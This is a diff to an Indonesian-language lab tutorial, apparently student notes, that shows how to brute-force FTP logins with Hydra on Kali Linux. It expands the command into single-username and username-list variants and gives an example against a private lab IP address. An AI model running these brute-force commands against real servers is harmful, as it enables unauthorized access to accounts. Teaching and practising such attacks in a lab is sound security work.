@@ -28,7 +28,10 @@
 #### 4. Cracking FTP menggunakan Kali Linux Hydra
 - Buka Kali Linux
 - `apt-get install hydra`
-- Run command hydra -L **<file.txt_userlists>** -P **<file.txt_passwordlist>** ftp://**<ip_target>**
+- Run command 
+-- hydra -l **<file.username>** -P **<password>** ftp://**<ip_target>** atau
+-- hydra -L **<file.txt_userlists>** -P **<file.txt_passwordlist>** ftp://**<ip_target>** atau 
+-- kombinasi dari salah satu dari keduanya
 - ex: hydra -L kristo -P /home/kali/Documents/Hatch/passlist.txt ftp://192.168.52.129
 - ![Screenshot Hydra](http://ardiankristo.it.student.pens.ac.id/folder/Screenshot%202020-11-24%20183404.png)
 
